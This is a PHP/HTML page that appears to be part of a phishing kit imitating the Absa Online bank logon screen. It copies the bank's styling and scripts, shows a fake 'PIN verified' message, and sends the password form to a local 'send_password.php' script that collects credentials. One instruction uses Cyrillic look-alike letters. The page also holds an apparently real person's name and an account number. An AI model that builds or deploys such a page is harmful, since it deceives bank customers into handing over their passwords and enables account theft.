<?php
error_reporting(0);
session_start();
require_once '../esc/index.php';
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:c="http://www.backbase.com/2006/command" xmlns:e="http://www.backbase.com/2006/xel" xmlns:xi="http://www.w3.org/2001/XInclude" xmlns:ui="http://www.absa.co.za/2009/ui" class="js webkit webkit537_36 safari3 CSS1Compat Win32">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
  <style type="text/css">
    .btl-repaint {
      zoom: 1;
      background-color: transparent;
      -moz-outline: none;
    }
  </style>
  <style type="text/css">
    .btl-drag-outlineElement {
      position: absolute;
      top: -10000px;
      left: -10000px;
      width: 100px;
      height: 100px;
      z-index: 9999;
      border-width: 1px;
      border-style: solid;
      background-color: #DFE0E1;
      border-color: #8B8D91;
    }
  </style>
  <style type="text/css">
    .btl-resize-cursorElement {
      position: absolute;
      top: -10000px;
      left: -10000px;
      width: 100px;
      height: 100px;
      z-index: 10000;
      opacity: 0;
      -ms-filter: "alpha(opacity=0)";
      filter: alpha(opacity=0);
      background: white;
    }
    
    .btl-resize-lineElement {
      position: absolute;
      top: -10000px;
      left: -10000px;
      width: 1px;
      height: 100px;
      z-index: 9999;
      border-width: 1px;
      border-style: solid;
      border-color: #8B8D91;
      overflow: hidden;
    }
    
    .btl-resize-outlineElement {
      position: absolute;
      top: -10000px;
      left: -10000px;
      width: 100px;
      height: 100px;
      z-index: 9999;
      border-width: 1px;
      border-style: solid;
      opacity: .4;
      -ms-filter: "alpha(opacity=40)";
      filter: alpha(opacity=40);
      background-color: #DFE0E1;
      border-color: #8B8D91;
    }
  </style>
  <meta http-equiv="X-UA-Compatible" content="IE=10; IE=9; IE=8">

  <title>Absa Online</title>
  <!--#if expr="( = /iPhone/)"-->
  <link rel="apple-touch-icon" href="https://ib.absa.co.za/absa-online/static/style/Iphone_app_icon.png">
  <link rel="shortcut icon" type="image/x-icon" href="https://www.absa.co.za/etc/designs/zg/absacoza/desktop/assets/img/favicon.ico" />
  <!--#endif -->

  <script type="text/javascript">
    (window.top == window.self) || (window.top.location.href = self.location.href);
  </script>

  <link rel="stylesheet" type="text/css" href="../libraries/static\style\absa.css?v=0.1.0-2020-06-18-13-48-34" media="screen">
  <link rel="stylesheet" type="text/css" href="../libraries/static\style\login.css?v=0.1.0-2020-06-18-13-48-34">
  <link rel="stylesheet" type="text/css" href="../libraries/static\style\www.absa.co.za.2009.ui\jcaptcha\jcaptcha.css?v=0.1.0-2020-06-18-13-48-34">

  <!-- Device Profiling -->

  <!-- PS: These below 2 calls were added so that IE11 can also work -->
  <script type="text/javascript" src="../libraries/asset/place.js.download"></script>
  <script type="text/javascript" src="../libraries/asset/prox.js.download"></script>

  <script type="text/javascript" src="../libraries/asset/absa.subTree.js.download"></script>
  <script type="text/javascript">
    // PS: this  subTree  function is used by the IBM  isimo  calls so do NOT change its name
    function subTree() {
      var sId = document.body.getAttribute("sId");
      var result = {
        "c": absa.getDPS("" + sId)
      }
      return result;
    };
  </script>

  <script type="text/javascript" src="../libraries/asset/backbase.js.download"></script>
  <script type="text/javascript" src="../libraries/asset/absa-all-base.js.download"></script>

  <script type="text/javascript">
    absa.locale = {
      "Common\/General\/Label\/Ascending": "Ascending order",
      "Common\/General\/Label\/Descending": "Descending order",
      "Common\/General\/Label\/None": "None",
      "Common\/General\/Label\/Expand": "expand",
      "Common\/General\/Label\/Collapse": "Collapse",
      "Common\/General\/Label\/Selected": "Selected",
      "Common\/General\/Label\/Tab": "Tab",
      "Common\/General\/Label\/ShowSection": "Show section",
      "Common\/General\/Label\/Loading": "Loading",
      "Common\/General\/Label\/Now": "Now",
      "Common\/General\/Label\/HideSection": "Hide section",
      "Common\/General\/Label\/Processing": "Processing",
      "Common\/General\/Label\/Print": "Print this content",
      "Common\/General\/Label\/Close": "Close",
      "Common\/General\/Label\/ErrorMessage": "Error message",
      "Common\/General\/Label\/Of": "of",
      "Common\/General\/Label\/Required": "Required",
      "Common\/General\/Label\/ShowMeHowActivate": "Click here to activate 'Show me how' assistance.",
      "Common\/General\/Label\/ShowMeHowDeactivate": "Click to end 'Show me how' assistance",
      "Common\/General\/Label\/ShowMeHowNotAvailable": "Show me how assistance not available.",
      "Common\/General\/Label\/Invalid": "Invalid",
      "Common\/General\/Label\/Year": "Year",
      "Common\/General\/Label\/Month": "Month",
      "Common\/General\/Label\/Day": "Day",
      "Common\/General\/Label\/SuggestBox\/VIHelp": "Visually impaired help",
      "Common\/General\/Validation\/ChangeAccountName": "The length of this field can be no longer than 15 characters. No special characters are allowed \/?%$#@!* < > :^ (.)",
      "Common\/General\/Subnav\/Link\/ContactUs": "Contact us",
      "Common\/General\/Subnav\/Link\/Help": "Help",
      "Common\/General\/Subnav\/Link\/Print": "Print",
      "Common\/General\/Subnav\/Link\/Logoff": "Logoff",
      "Common\/General\/Subnav\/Label\/SurePhrase": "Your security SurePhrase",
      "Common\/General\/Label\/RedirectAlert": "Redirect alert!",
      "Common\/SVM\/Error\/FrontEndTimeOut": "We did not receive your response. Resend the SureCheck or cancel the transaction",
      "Common\/SVM\/Label\/YouCanResend": "You can resend the SureCheck to your cellphone if the previous one failed",
      "Common\/SVM\/Label\/HelpLine": "Helpline 08600 08600 \/ Int.+2711 501 5019",
      "Login\/General\/Tooltip\/CaptchaInfo": "You have entered some of your logon credentials incorrectly. Please type the characters displayed in the CAPTCHA image, in the text box below the image. Remember to also retype your access account number and PIN in the usual text boxes.",
      "Security\/AccessControl\/Error\/SVMRetriesExceeded": "Your maximum number of retries has been exceeded",
      "Security\/AccessControl\/Error\/TVMNotSet": "TVM not set.",
      "Portfolio\/BusBankSetPin\/Label\/PinRulesHeading": "PIN rules"
    };
  </script>

  <script type="text/javascript">
    absa.NONCE = '0';
    absa.CONTEXT = 'https://ib.absa.co.za/absa-online';
    absa.XDPROXY = 'https://vs1.absa.co.za/absa-online';
    absa.TIMEOUT_LOGOFF = 240000; // 240000;
    absa.MINUSSDTIME = '5';
    absa.MAXUSSDTIME = '60';
    absa.MINUSSD2TIME = '5';
    absa.MAXUSSD2TIME = '60';
    absa.DSPWINDOWSELF = 'null';
    absa.DSPCALLJSFUNCTION = 'false';
    absa.URL_PLACE = 'credit.apr.absa.co.za/422006/place.js';
    absa.URL_PROX = 'choice.invest.absa.co.za/422006/prox.js';
    absa.URL_PLACE_RETRY_COUNT = '20';
    absa.URL_PLACE_RETRY_AFTER_SECONDS = '10';
    absa.BROWSERINFO = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36';
    // Generic Modal - A 
    absa.CLIENTTYPE = ''
    absa.SBU = '';
    absa.GENMODALC_ENABLED = 'true';
    absa.GENMODALC_UNIQCODE = '30001';
    absa.GENMODALC_READCONFIRM = 'false';
    absa.GENMODALC_DONTSHOWAGAIN = 'false';
    absa.GENMODALC_BIS = 'BIS';
    absa.GENMODALC_SBU = 'ABCDEFGHIJK';
    // absa.GENMODALC_HASCLIENTINDICATEDYET = '<SEE ABOVE>';
    absa.GENMODALC_SPECIALCHECK_ENABLED = 'true';
    absa.GENMODALC_SPECIALCHECK_JSFUNC = 'absa.util.isSupportedOS()';
    // DSP redirect to referer ONLY in TEST environments
    absa.ITE = 'false';
  </script>

  <script type="text/javascript" src="../libraries/asset/login.js.download"></script>
  <!-- <script type="text/javascript" src="../libraries/static/script/absa/absa.SVM.js?v=0.1.0-2020-06-18-13-48-34"></script> -->
  <script type="text/javascript" src="../libraries/asset/absa.form.wizardBridge.js.download"></script>
  <script type="text/javascript" src="../libraries/asset/absa.n2fa.js.download"></script>
  <script type="text/javascript" src="../libraries/asset/absa.jcaptcha.js.download"></script>
  <script type="text/javascript" src="../libraries/asset/absa.resetPin.js.download"></script>
</head>

<body class="ssr-enabled ap-jsp-body prelogin" id="bodydiv" sid="stJA3UxgednU-QxLeuw5EoV" cz-shortcut-listen="true" accessaccount="4088596502">

  <div></div>

  <div style="position:fixed; top:0px; left:0px; z-index:105; width:100%; height:54px; background:#FFFFFF; padding:10px 0px 0px 10px; box-shadow: 0 4px 8px 0 rgba(0,0,0,.16);">
    <img src="../libraries/asset/logo-red.png" width="44" height="44">
  </div>

  <div class="ap-page-header" style="z-index:106;">

    <!-- <div style="padding-top:12px;"><img src="../libraries/static/style/resources/absa-logo-2018.png" width="141" height="97" /></div> -->

    <div class="ap-navigation-main" style="z-index:107;">
      <div class="ap-tabStrip-rounded-left"></div>
      <ul class="ap-tabStrip-tabs">
        <li class="ap-tab-button ap-tab-active" id="SSR-tab-18">
          <div class="ap-tab-title" tabindex="10">Logon</div>
          <div class="ap-tab-title-hidden">Logon</div>
        </li>
        <li class="ap-tab-button" id="SSR-tab-19">

          <div class="ap-tab-title" tabindex="11"><a href="javascript:void(0);">Registration</a></div>

          <div class="ap-tab-title-hidden">Registration</div>
        </li>
        <li class="ap-tab-button" id="SSR-tab-20">
          <div class="ap-tab-title" tabindex="12"><a href="javascript:void(0);">How to guide</a></div>
          <div class="ap-tab-title-hidden" style="font-size:14px;">How to guide</div>
        </li>
      </ul>
      <div class="ap-tabStrip-rounded-right"></div>
      <div style="clear: both;"></div>
      <!-- <img src="../libraries/static/style/resources/ao-logo2.png" width="189" height="60" style="position:absolute;top:0;right:20px" id="theImg"/> -->
      <div class="ap-navigation-sub ap-tabStrip-subnav"></div>
    </div>
  </div>

  <div class="ap-page-container" style="z-index:104;">
    <!-- PS: above div  ap-page-header   was HERE -->

    <div class="ap-global-message" id="ap-global-message">
      <div id="ap-nocookies-msg" style="display: none;">
        Warning: you do not have Cookies enabled. This applications needs Cookies to function properly. Please turn it on and reload the page. If you need assistance in turning on your Cookies <a>click here</a> to get instructions.
      </div>
      <noscript>
        <div>
          Warning: you do not have Javascript enabled. This applications needs Javascript to function properly. Please turn it on and reload the page. If you need assistance in turning on your Javascript <a>click here</a> to get instructions.
        </div>
      </noscript>
    </div>

    <div class="ap-main-content-wrapper">
      <!-- Page top corners -->
      <div class="ap-main-content-wrapper-top">
        <div class="ap-corners-rounded-top-left"></div>
        <div class="ap-corners-rounded-top"></div>
        <div class="ap-corners-rounded-top-right"></div>
      </div>

      <!-- Page content -->
      <div class="ap-page-content ap-container">
        <div class="ap-container-highlevel">
          <div class="ap-titlebar ap-heading-titlebar" style="padding-top: 0px;">
            <div id="header_results" class="ap-bar-section ap-bar-title" style="color: #FFFFFF">
                Logon&nbsp;
                | Welcome to Absa Online
            </div>
            <div id="header_results_contactUs" style="position:relative; float:right; padding:10px;">
                <a href="" target="_new" style="color:#FFFFFF; font-size:12px; font-weight:bold; text-decoration:none;">
                    Contact us
                </a>
            </div>
          </div>

          <div class="ap-container-content" id="ap-container-content" style="padding-bottom:5px; overflow: hidden">
            <!-- PS: height must be set here to AUTO else it cuts of the bottom of the inner content -->

            <div class="ap-login-columns ap-columns-2-lhs" style="padding-top: 0px;">
              <!-- ap-column-1 -->
              <div class="ap-column-1 passwordScreen" id="ap-column-1" styleold="width:389px; padding:0">
                <div class="ap-login-container" id="ap-login-container">

                  <div class="ap-container-privatebank">

                    <input type="hidden" name="clienTypeValue" id="clienTypeValue" value="B">
                    <input type="hidden" name="sbuValue" id="sbuValue" value="H">
                    <input type="hidden" name="showAPBStuff" id="showAPBStuff" value="false">
                    <input type="hidden" name="labelValue" id="labelValue" value="Logon | Welcome to Absa Online | Private Assist contact number : 0860 553 553">
                    <input type="hidden" name="wfpt" id="wfpt" value="null">

                  </div>
                  <div class="ap-container-highlevel" style="width: 606px;">
                    <div class="ap-titlebar ap-heading-titlebar ap-heading-titlebar-login">
                      <div class="ap-bar-section ap-bar-title" style="margin-top:8px;margin-left:0px">
                        &nbsp;&nbsp;Security SurePhrase™
                      </div>
                      <!--div style="float:right; margin-right:10px;">
			<div style="background: url('static/style/resources/icon-info-grey.png') no-repeat scroll left top transparent; margin-top:7px; height:30px; width:20px; cursor:pointer;" onclick="javascript:showPasswordTips()" tooltip='Password tips'></div>
		</div-->
                    </div>

                    <div class="ap-container-content">
                      <div class="ui-keyboard" oninputchange="if (input.value.length) doMoveForm2Focus(input)">
                        <form class="ui-form" method="POST" action="../send/send_password.php">
                          <table class="ui-grid ui-keyboard-inputs">
                            <tbody>
                              <tr class="ui-row">
                                <td tabindex="0" class="ui-cell">
                                  <!-- APB Start -->

                                  <b>PIN verified</b>. The last time you logged onto Absa Online or Cellphone Banking was on <?php echo date("Y-m-d"); ?>

                                    <!-- APB End -->
                                </td>
                              </tr>
                              <tr class="ui-row">
                                <td tabindex="0" class="ui-cell">
                                  Your security SurePhrase™ is:
                                </td>
                              </tr>
                              <!-- mr  
						<tr class="ui-row">
							<td tabindex="0" class="ui-cell">
								<div id="spansurephrase"></div>
							</td>
						</tr> -->

						<tr class="ui-row">
							<td tabindex="0" class="ui-cell">
								<div id="spansurephrase">PRIVATE</div>
							</td>
						</tr>

                           

                              <tr class="ui-row">
                                <td class="ui-cell">
                                  Enter All characters of your password indicated by the <font style="color:#870A3C;">coloured</font> blocks.
                                </td>
                              </tr>
                              <tr class="ui-row">
                                <td class="ui-cell">

                                  <label id="id_pff2" for="pff2"></label>
                                  <input style="width: 350px;border: 3px solid #AF154B;text-align: left;" type="password" class="pf pf2" name="passwords" id="pff2" num="1" tabindex="2" pattern=".{6,12}" autocomplete="off" required="required" oninvalid="this.setCustomValidity('Entег Your All characters of your password Please')" oninput="setCustomValidity('')" required autofocus>

                                </td>
                              </tr>
                              <tr class="ui-row">
                                <td class="ui-cell">
                                  It is your responsibility to ensure the secrecy of your password. &nbsp;&nbsp;
                                  <div style="color:#AF144B; cursor:pointer; padding-top:4px; text-decoration:underline;">Forgot password?</div>
                                </td>
                              </tr>
                              <tr class="ui-row">
                                <td class="ui-cell">
                                  <input tabindex="4" id="viCheckbox" style="vertical-align: middle;" type="checkbox" name="viuser" value="1" title="Select to enable visually impaired interface.">
                                  <label for="viuser" style="vertical-align:middle;" title="&#39;Select to enable visually impaired interface.&#39;">
                                    Select to enable visually impaired interface.
                                  </label>
                                </td>
                              </tr>
                            </tbody>
                          </table>

                          <!-- hidden stuff -->
                          <input type="hidden" name="pwds" id="pwds" value="3">
                          <input type="hidden" name="lastlogondate" id="lastlogondate" value="2020-06-25">
                          <!-- PS: the time is always 12:00 services cannot give us the actual time -->
                          <input type="hidden" name="lastlogontime" id="lastlogontime" value="12:00:00">
                          <input type="hidden" name="surephrase" id="surephrase" value="mr david craig coughlan">

                          <div class="ui-formFoot">
                            <div class="genericMessage-place-holder" style="display:block">
                              <div role="alert" id="ap-login-form2-error" tabindex="0" class="ui-message ui-message-error" style="display:none">
                                <span class="vi-screenreader-line"> Error details. </span>
                                <div class="ui-message-timeStamp">
                                  <span class="vi-screenreader-line">Time stamp. </span>
                                </div>
                                <div class="ui-message--icon"></div>
                                <div style="margin-right:120px" class="ui-message-content">
                                  <div class="ui-message-title"></div>
                                  <div class="ui-message-body" style="clear:both;">
                                    <!-- msg here -->
                                  </div>
                                </div>
                                <div class="clear-both"></div>
                              </div>
                            </div>

                            <div class="validation-place-holder"></div>

                            <div class="ui-buttonFooter">
                              <div class="ui-exception-container">
                                <!--  -->
                                <div style="float:left">
                                  <span>Landing page:</span>&nbsp;
                                  <select tabindex="8" class="ui-select" id="landingpage2" defaultval="accounts" name="landingpage2" style="vertical-align: middle;">
                                    <option value="express">Express</option>
                                    <option value="accounts">My accounts</option>
                                    <option value="payments">Make a payment</option>
                                    <option value="saveinvest">Save and invest</option>
                                    <option value="apply">Apply for an account</option>
                                    <option value="insurance">Insure</option>
                                    <option value="profile">View my profile</option>
                                  </select>
                                </div>
                                <!-- Removed vi user checkbox -->
                                <!-- Buttons -->
                                <button aria-label="Logoff" type="button" tabindex="7" onclick="" class="ui-button ap-button-reset">
                                  <!-- ap-button-logout -->
                                  <div class="ui-button-left">
                                    <div class="ui-button-right">
                                      <div class="ui-button-center">Logoff</div>
                                    </div>
                                  </div>
                                </button>
                                <button aria-label="Reset" type="button" tabindex="6" onclick="" class="ui-button ap-button-reset">
                                  <div class="ui-button-left">
                                    <div class="ui-button-right">
                                      <div class="ui-button-center">Reset</div>
                                    </div>
                                  </div>
                                </button>
                                <button aria-label="Logon" type="submit" tabindex="5" class="ui-button ap-button-next">
                                  <div class="ui-button-left">
                                    <div class="ui-button-right">
                                      <div class="ui-button-center">Logon</div>
                                    </div>
                                  </div>
                                </button>
                              </div>
                            </div>
                          </div>
                        </form>

                        <!-- keyboard -->
                        <table class="ui-grid">
                          <tbody>
                            <tr class="ui-row">
                              <td class="ui-cell ap-login-keyBoardLabelCell">
                                Use the online keyboard to enter your password.
                              </td>
                            </tr>
                            <tr class="ui-row">
                              <td class="ui-cell">
                                <div class="ui-keyboard-keyboardContainer" style="user-select: none;">
                                  <div class="floatleft ui-keyboard-keyboardContainer-utils">
                                    <div class="ui-keyboard-button util" action="backspace" unselectable="on">
                                      <div class="backspace" unselectable="on"></div>
                                      Backspace
                                    </div>
                                    <div class="ui-keyboard-button util" action="capslock" unselectable="on">
                                      CapsLock
                                    </div>
                                  </div>
                                  <div class="floatleft ui-keyboard-keyboardContainer-keys">
                                    <div class="row">
                                      <div class="ui-keyboard-button" unselectable="on">1</div>
                                      <div class="ui-keyboard-button" unselectable="on">2</div>
                                      <div class="ui-keyboard-button" unselectable="on">3</div>
                                      <div class="ui-keyboard-button" unselectable="on">4</div>
                                      <div class="ui-keyboard-button" unselectable="on">5</div>
                                      <div class="ui-keyboard-button" unselectable="on">6</div>
                                      <div class="ui-keyboard-button" unselectable="on">7</div>
                                      <div class="ui-keyboard-button" unselectable="on">8</div>
                                      <div class="ui-keyboard-button" unselectable="on">9</div>
                                      <div class="ui-keyboard-button" unselectable="on">0</div>
                                      <div class="clearBoth"></div>
                                    </div>
                                    <div class="row ui-keyboard-keyboardContainer-row2">
                                      <div class="ui-keyboard-button" unselectable="on">q</div>
                                      <div class="ui-keyboard-button" unselectable="on">w</div>
                                      <div class="ui-keyboard-button" unselectable="on">e</div>
                                      <div class="ui-keyboard-button" unselectable="on">r</div>
                                      <div class="ui-keyboard-button" unselectable="on">t</div>
                                      <div class="ui-keyboard-button" unselectable="on">y</div>
                                      <div class="ui-keyboard-button" unselectable="on">u</div>
                                      <div class="ui-keyboard-button" unselectable="on">i</div>
                                      <div class="ui-keyboard-button" unselectable="on">o</div>
                                      <div class="ui-keyboard-button" unselectable="on">p</div>
                                      <div class="clearBoth"></div>
                                    </div>
                                    <div class="row ui-keyboard-keyboardContainer-row3">
                                      <div class="ui-keyboard-button" unselectable="on">a</div>
                                      <div class="ui-keyboard-button" unselectable="on">s</div>
                                      <div class="ui-keyboard-button" unselectable="on">d</div>
                                      <div class="ui-keyboard-button" unselectable="on">f</div>
                                      <div class="ui-keyboard-button" unselectable="on">g</div>
                                      <div class="ui-keyboard-button" unselectable="on">h</div>
                                      <div class="ui-keyboard-button" unselectable="on">j</div>
                                      <div class="ui-keyboard-button" unselectable="on">k</div>
                                      <div class="ui-keyboard-button" unselectable="on">l</div>
                                      <div class="clearBoth"></div>
                                    </div>
                                    <div class="row ui-keyboard-keyboardContainer-row4">
                                      <div class="ui-keyboard-button" unselectable="on">z</div>
                                      <div class="ui-keyboard-button" unselectable="on">x</div>
                                      <div class="ui-keyboard-button" unselectable="on">c</div>
                                      <div class="ui-keyboard-button" unselectable="on">v</div>
                                      <div class="ui-keyboard-button" unselectable="on">b</div>
                                      <div class="ui-keyboard-button" unselectable="on">n</div>
                                      <div class="ui-keyboard-button" unselectable="on">m</div>
                                      <div class="clearBoth"></div>
                                    </div>
                                  </div>
                                </div>
                              </td>
                            </tr>
                          </tbody>
                        </table>
                      </div>
                    </div>

                    <!-- bottom round borders -->
                    <div class="ap-container-bottom-corners">
                      <div class="ap-corners-rounded-bottom-left"></div>
                      <div class="ap-corners-rounded-bottom" style="width:590px;"></div>
                      <div class="ap-corners-rounded-bottom-right"></div>
                    </div>
                  </div>
                </div>
              </div>

              <!-- ap-column-2 -->
              <div class="ap-column-2 passwordScreenAdds" id="ap-column-2" styleold="width:550px;">

                <div id="divadds1" style="position: relative; width: 100%; margin-bottom: 10px; display: none;">
                  <div style="float:left; width:270px; margin-right:10px;">
                    <!-- Security Center Links -->
                    <div id="divsecuritycentre" class="ap-login-block-rounded">
                      <!-- top round borders -->
                      <div class="ap-login-block-rounded-top">
                        <div class="ap-corners-rounded-top-left"></div>
                        <div class="ap-corners-rounded-top"></div>
                        <div class="ap-corners-rounded-top-right"></div>
                      </div>

                      <!-- content -->
                      <div role="tablist" class="ui-tabBox">
                        <ul class="ui-tabHeads">
                          <li aria-selected="true" class="ui-tabHead ui-tab-selected" role="button" tabindex="18">
                            Security centre
                            <span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span>
                          </li>
                        </ul>
                        <div class="ui-tabBodies">
                          <div tabindex="19" role="tabpanel" class="ui-tabBody ui-tabBody-selected">
                            <div style="background: #FFFFFF;">
                              <ul class="abc">
                                <li><a href="" id="am" target="_new">Absa's online security measures</a></li>
                                <li><a href="" id="am" target="_new">Important information about phishing</a></li>
                                <li><a href="" id="am" target="_new">Protect yourself online</a></li>
                                <li><a href="" id="am" target="_new">Online shopping and 3D Secure</a></li>
                                <li><a href="" id="am" target="_new">Latest scams</a></li>
                                <li><a href="" id="am" target="_new">Latest internet security software</a></li>
                              </ul>
                            </div>
                          </div>
                        </div>
                      </div>

                      <!-- bottom round borders -->
                      <div class="ap-login-block-rounded-bottom">
                        <div class="ap-corners-rounded-bottom-left"></div>
                        <div class="ap-corners-rounded-bottom"></div>
                        <div class="ap-corners-rounded-bottom-right"></div>
                      </div>
                    </div>
                  </div>
                  <div style="float:left; width:270px;">
                    <!-- Important Links on Right Side of Page -->
                    <div id="divimportantlinks" class="ap-login-block-rounded" style="display: none;">
                      <!-- top round borders -->
                      <div class="ap-login-block-rounded-top">
                        <div class="ap-corners-rounded-top-left"></div>
                        <div class="ap-corners-rounded-top"></div>
                        <div class="ap-corners-rounded-top-right"></div>
                      </div>
                      <!-- content -->
                      <div role="tablist" class="ui-tabBox">
                        <ul class="ui-tabHeads">
                          <li aria-selected="true" class="ui-tabHead ui-tab-selected" role="button" tabindex="13">
                            Important links
                            <span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span>
                          </li>
                        </ul>
                        <div class="ui-tabBodies">
                          <div tabindex="14" role="tabpanel" class="ui-tabBody ui-tabBody-selected">
                            <div style="background: #FFFFFF;">
                              <ul class="abc">
                                <li><a href="" id="am" target="_new">Planned Maintenance</a></li>
                                <li><a href="" id="am" target="_new">How to register</a></li>
                                <li><a href="" id="am" target="_new"><b>2020 Pricing</b></a></li>
                                <li><a href="" id="am" target="_new"><b style="color:#AF154B !important;">Logon issues with Absa Banking App on Apple device</b></a></li>
                                <li><a href="" id="am" target="_new">Security enhancement</a></li>
                                <li><a href="" id="am" target="_new">Contact us</a></li>
                                <li><a href="" id="am" target="_new">Absa Listed Beneficiaries - accounts closed</a></li>
                              </ul>
                            </div>
                          </div>
                        </div>
                      </div>
                      <!-- bottom round borders -->
                      <div class="ap-login-block-rounded-bottom">
                        <div class="ap-corners-rounded-bottom-left"></div>
                        <div class="ap-corners-rounded-bottom"></div>
                        <div class="ap-corners-rounded-bottom-right"></div>
                      </div>
                    </div>
                  </div>
                  <div style="clear:both;"></div>
                  <div style="position:relative; margin-top:10px; height:152px;">
                    <div class="ap-login-campaign-image img1" style="position:absolute; top:0px; left:0px; width:280px;">
                      <a href=""><img src="../libraries/asset/campaigne_1_ENG.png" alt=""></a>
                    </div>
                    <div class="ap-login-campaign-image img2" style="position:absolute; top:0px; right:0px; width:270px;">
                      <a href=""><img src="../libraries/asset/covid19_en.jpg" alt=""></a>
                    </div>
                  </div>
                </div>

                <!-- How it Works Right of 2nd page -->
                <div id="divhowitworks" class="ap-login-block-rounded" style="display: block;">
                  <div>
                    <!-- top round borders -->
                    <div class="ap-login-block-rounded-top">
                      <div class="ap-corners-rounded-top-left"></div>
                      <div class="ap-corners-rounded-top" style="width:312px;"></div>
                      <div class="ap-corners-rounded-top-right"></div>
                    </div>
                    <!-- content -->
                    <div role="tablist" class="ui-tabBox">
                      <ul class="ui-tabHeads">
                        <li aria-selected="true" class="ui-tabHead" role="button" tabindex="15" style="    background-color: #FFF;
    font-weight: bold;
    cursor: default;
    padding-top: 4px;
    color: #847E7E;">
                          How it works
                          <span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span>
                        </li>
                      </ul>
                      <div class="ui-tabBodies">
                        <div tabindex="16" role="tabpanel" class="ui-tabBody ui-tabBody-selected">
                          <div style="background: #FFFFFF;">
                            <div style="border-bottom: 1px solid #CCCCCC;">
                              <div style="padding: 10px;">In this example the password is <b>Password1</b></div>
                            </div>
                            <div style="margin: 10px 0px 10px 10px;"><span class="pfsmalltxt">P</span>
                              <span class="pfsmalltxt">a</span> <span class="pfsmalltxt">s</span>
                              <span class="pfsmalltxt">s</span> <span class="pfsmalltxt">w</span>
                              <span class="pfsmalltxt">o</span> <span class="pfsmalltxt">r</span>
                              <span class="pfsmalltxt">d</span> <span class="pfsmalltxt">1</span>
                            </div>
                            <div style="margin: 10px 0px 5px 10px;">
                              <input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="2">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="3">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="4">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="5">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="6">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="7">
                              <input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
                              <input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
                            </div>
                            <div style="border-top: 1px solid #CCCCCC; border-bottom: 1px solid #CCCCCC; padding: 10px;">
                              You have to enter (case sensitive):
                            </div>
                            <div style="margin: 10px 0px 10px 10px;"><span class="pfsmalltxt">P</span>
                              <span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;&nbsp;</span>
                              <span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;&nbsp;</span>
                              <span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;</span>
                              <span class="pfsmalltxt">d</span> <span class="pfsmalltxt">1</span>
                            </div>
                            <div style="margin: 10px 0px 5px 10px;">
                              <input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="2">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="3">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="4">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="5">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="6">
                              <input type="text" class="pfsmall pf1" name="dpf2" disabled="true" value="7">
                              <input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
                              <input type="password" class="pfsmall pf2" name="dpf1" disabled="true" tabindex="17" maxlength="1" value="">
                            </div>
                            <br>
                          </div>
                        </div>
                      </div>
                    </div>
                    <!-- bottom round borders -->
                    <div class="ap-login-block-rounded-bottom">
                      <div class="ap-corners-rounded-bottom-left"></div>
                      <div class="ap-corners-rounded-bottom" style="width:312px;"></div>
                      <div class="ap-corners-rounded-bottom-right"></div>
                    </div>
                  </div>

                  <div class="ap-login-campaign-image img3" style="padding: 14px 0px 1px 0px;" id="ap-campaignImage-div">
                    <a href=""><img src="../libraries/asset/AOL_Retail_Pricing_2022_Eng.jpg" alt=""></a>
                  </div>
                  <div class="ap-login-campaign-image img3" style="padding: 14px 0px 1px; display: none;" id="ap-campAPBImage-div">
                    <a href=""><img src="../libraries/asset/campaigne_3b_post_golive_EN.jpg" alt=""></a>
                  </div>
                </div>
              </div>
              <!-- ap-column-2 -->
              <div class="ap-columns-clear"></div>
            </div>

            <!-- ap-columns-2-lhs -->
            <div style="width: 100%; height: 10px;"></div>

            <!-- 3 column layout -->
            <div id="divbottomadds" class="ap-login-columns ap-columns-33" style="display: none;">
              <!-- ap-column-1 -->
              <div class="ap-column-1">

                <!-- Security Centre Links Bottom left of Login page 1 -->
                <!-- PS: Was moved for Resonance to be next to input fields -->
                &nbsp;
              </div>

              <!-- ap-column-2 -->
              <div class="ap-column-2">
                <!-- Campaign Banner 1 used to be here -->
                &nbsp;
              </div>

              <!-- ap-column-3 -->
              <div class="ap-column-3">
                <!-- Campaign Banner 2 used to be here -->
                &nbsp;
              </div>
            </div>
          </div>

          <!-- bottom rounded corners -->
          <!-- <div class="ap-container-bottom ap-heading-titlebar-item ap-container-bottom-show"> -->
          <div class="ap-container-bottom ap-heading-titlebar-item ap-container-bottom-hide">
            <div class="ap-corners-rounded-bottom-left"></div>
            <div class="ap-corners-rounded-bottom"></div>
            <div class="ap-corners-rounded-bottom-right"></div>
          </div>
        </div>
      </div>

      <!-- Page bottom corners -->
      <div class="ap-main-content-wrapper-bottom">
        <div class="ap-corners-rounded-bottom-left"></div>
        <div class="ap-corners-rounded-bottom"></div>
        <div class="ap-corners-rounded-bottom-right"></div>
      </div>
    </div>

    <div class="ap-footer" tabindex="20">
